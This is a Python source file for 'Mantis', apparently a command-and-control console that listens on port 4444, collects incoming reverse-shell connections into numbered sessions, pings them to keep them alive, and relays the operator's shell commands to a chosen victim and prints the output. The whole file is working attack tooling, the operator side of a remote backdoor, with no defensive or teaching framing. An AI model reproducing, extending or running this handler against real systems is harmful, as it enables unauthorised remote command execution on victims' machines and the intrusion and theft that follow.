'''
some doc will be here
'''
import subprocess
from socket import socket
from threading import Thread
from time import sleep

class Session:
    note = ""
    addr = None
    sock = None
    detail = ""
    prompt = "# "

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        text = sock.recv(1024).decode('gbk').split('`')
        self.prompt = text[0]
        self.detail = text[1]


    def shell(self):
        while True:
            cmd = input(self.prompt)
            other = cmd.split(' ')
            first = other[0]

            if first == '':
                continue
            elif first == 'exit':
                self.sock.close()
                break
            elif first == 'bg':
                break
            else:
                self.sock.send(('shell '+cmd).encode('gbk'))
                flag = True
                while flag:
                    try:
                        data = self.sock.recv(1024).decode('gbk')
                        if data.endswith('``````````'):
                            flag = False
                            data = data.replace('``````````','')
                        print(data)
                    except Exception as e:
                        print(e)

    def upload(self):
        pass
    def download(self):
        pass
                            


prompt = "Mantis# "
host = '0.0.0.0'
port = 4444
sessions = dict()
idx = 0
exploit_flag = False
exploit_thread = None


def showhelp():
    print(
''' exit
 help
 shell cmd
 options
 exploit
 sessions
 bind 0.0.0.0 4444
 ----------------for-shell-------------------- 
 up souce dest
 down desr source''')

def exploit():
    global idx, sessions
    server = socket()
    server.bind((host, port))
    server.listen(1024)

    while exploit_flag:
        client, addr = server.accept()
        Thread(target=pingtest, args=(idx,client)).start()
        print(f"\r[+] Session {idx} has been opened from {addr} !")
        session = Session(client,addr)
        sessions[idx] = session
        idx+=1

def pingtest(session_id, sock):
    global sessions
    while True:
        try:
            sock.send(b"mantis")
        except Exception:
            if session_id in sessions.keys():
                del sessions[session_id]
                print(f"\r[*] Clear ineffective sesssion {session_id}")
        sleep(30)

if __name__ == '__main__':

    while True:       
        opts = input(prompt).split(' ')
        if len(opts)>0:
            first = opts[0]

            if   first == 'exit':
                exit(0)

            elif first == 'help':
                showhelp()

            elif first == 'shell':
                cmd = ''
                for i in range(1,len(opts)):
                    cmd += opts[i]+' '
                print(
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    .communicate()[0]
                    .decode('gbk')
                    )

            elif first == 'options':
                print(f'[*] exploit_flag = {exploit_flag}')
                print(f'[*] listen_addr = {host}:{port}')

            elif first == 'exploit':
                if not exploit_flag:
                    exploit_flag = True
                    exploit_thread = Thread(target=exploit)
                    exploit_thread.start()

                    print(f"[*] Mantis starts listening on {host}:{port} ...")
                else:
                    print(f"[-] Mantis has exploiting on {host}:{port}")

            elif first == 'bind':
                exploit_flag = False
                print("[+] Kill the exploit thread !")
                if len(opts)==3:
                    host = opts[1]
                    port = int(opts[2])

            elif first == 'note':
                if len(opts) > 2:
                    sessions[int(opts[1])].note = opts[2]
                else:
                    print("[-] note session_id text")

            elif first == 'sessions':
                if len(opts) == 2:
                    session_id = int(opts[1])
                    if session_id in sessions.keys():
                        sessions[int(opts[1])].shell()
                    else:
                        print(f"[-] No session {session_id} !")
                else:
                    print(f" Total: {len(sessions)} idx: {idx}")
                    for i in sessions:
                        session = sessions[i]
                        print(f" {i}\t{session.addr}\t{session.detail}\t{session.note}")

            else:
                print("[-] "+str(opts))
                